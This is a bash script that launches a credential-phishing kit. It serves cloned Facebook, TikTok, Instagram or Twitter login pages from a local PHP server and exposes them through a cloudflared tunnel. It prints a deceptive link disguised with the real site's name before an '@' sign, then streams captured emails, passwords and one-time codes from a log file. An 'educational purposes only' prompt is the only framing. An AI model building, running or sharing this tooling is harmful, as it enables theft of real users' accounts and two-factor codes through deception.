#!/bin/bash

clear
echo ""
read -p '   E D U C A T I O N A l  P U R P O S E S  O N L Y ?  (Y/N) :' option

if [[ $option == *'N'* ]]; then
	clear
	exit
	fi
	if [[ $option == *'n'* ]]; then
		clear
		exit
		fi
		
		php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
		ngrok="$(ps -efw | grep cloudflared | grep -v grep | awk '{print $2}')"
		kill -9 $php
		kill -9 $cloudflared
		clear
		bash Logo.sh
		 
		echo ""

read -p " ＳＥＬＥＣＴ：" option
echo ""

if [ $option = 01 ] || [ $option = 1 ]
	then 
	cd main/ 
	cd facebook/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:8080 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ CLOUDFLARE STARTING...... █       '
	echo  '       ---------------------------        '
	cd ..
	cd ..
	rm .link.log >> /dev/null 2>&1 &
	./cloudflared tunnel -url 127.0.0.1:8080 --logfile .link.log > /dev/null 2>&1 &
	sleep 1
	echo  '       CLOUDFLARE LOADING.                '
	sleep 1
	echo  '       CLOUDFLARE LOADING..               '
	sleep 1
	echo  '       CLOUDFLARE LOADING...              '
	sleep 1
	echo  '       GENERATING LINK                    '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	mask="https://facebook.com"
	link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log")
	link1=${link#https://}
	echo -e "\n [-] URL 1 : $link"
	echo -e "\n [-] URL 2 : $mask@$link1"
	echo ' '
	echo ' -----------------------------'
	echo '█ EMAIL AND PASSWORD with OTP █'
	echo ' -----------------------------'
	cd main/
	cd facebook/
	tail -f log.txt
	
	
	break;
	
	elif [ $option = 02 ] || [ $option = 2 ]
	then
	cd main/
	cd tiktok/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:8080 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ CLOUDFLARE STARTING...... █       '
	echo  '       ---------------------------        '
	cd ..
	cd ..
	rm .link.log >> /dev/null 2>&1 &
	./cloudflared tunnel -url 127.0.0.1:8080 --logfile .link.log > /dev/null 2>&1 &
	sleep 1
	echo  '       CLOUDFLARE LOADING.                '
	sleep 1
	echo  '       CLOUDFLARE LOADING..               '
	sleep 1
	echo  '       CLOUDFLARE LOADING...              '
	sleep 1
	echo  '       GENERATING LINK                    '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	mask="https://tiktok.com"
	link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log")
	link1=${link#https://}
	echo -e "\n [-] URL 1 : $link"
	echo -e "\n [-] URL 2 : $mask@$link1"
	echo ' '
	echo ' -----------------------------'
	echo '█ EMAIL AND PASSWORD with OTP █'
	echo ' -----------------------------'
	cd main/
	cd tiktok/
	tail -f log.txt
	
	
	break;
	elif [ $option = 03 ] || [ $option = 3 ]
	then
	cd main/
	cd instagram/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:8080 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ CLOUDFLARE STARTING...... █       '
	echo  '       ---------------------------        '
	cd ..
	cd ..
	rm .link.log >> /dev/null 2>&1 &
	./cloudflared tunnel -url 127.0.0.1:8080 --logfile .link.log > /dev/null 2>&1 &
	sleep 1
	echo  '       CLOUDFLARE LOADING.                '
	sleep 1
	echo  '       CLOUDFLARE LOADING..               '
	sleep 1
	echo  '       CLOUDFLARE LOADING...              '
	sleep 1
	echo  '       GENERATING LINK                    '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	mask="https://instagram.com"
	link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log")
	link1=${link#https://}
	echo -e "\n [-] URL 1 : $link"
	echo -e "\n [-] URL 2 : $mask@$link1"
	echo ' '
	echo ' -----------------------------'
	echo '█ EMAIL AND PASSWORD with OTP █'
	echo ' -----------------------------'
	cd main/
	cd instagram/
	tail -f log.txt
	
	
	
	break;
	elif [ $option = 04 ] || [ $option = 4 ]
	then
	cd main/
	cd twitter/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:8080 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ CLOUDFLARE STARTING...... █       '
	echo  '       ---------------------------        '
	cd ..
	cd ..
	rm .link.log >> /dev/null 2>&1 &
	./cloudflared tunnel -url 127.0.0.1:8080 --logfile .link.log > /dev/null 2>&1 &
	sleep 1
	echo  '       CLOUDFLARE LOADING.                '
	sleep 1
	echo  '       CLOUDFLARE LOADING..               '
	sleep 1
	echo  '       CLOUDFLARE LOADING...              '
	sleep 1
	echo  '       GENERATING LINK                    '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	mask="https://twitter.com"
	link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log")
	link1=${link#https://}
	echo -e "\n [-] URL 1 : $link"
	echo -e "\n [-] URL 2 : $mask@$link1"
	echo ' '
	echo ' -----------------------------'
	echo '█ EMAIL AND PASSWORD with OTP █'
	echo ' -----------------------------'
	cd main/
	cd twitter/
	tail -f log.txt
	
	break;
	 	
	elif [ $option = 99 ]
	then     
	echo ' LAGOT KA!!! ' 
	exit 
	break;
	
	else 
		
		echo
		echo  " BOBO!! NUMBER HINDI LETTER "
		sleep 2
		exit
		fi
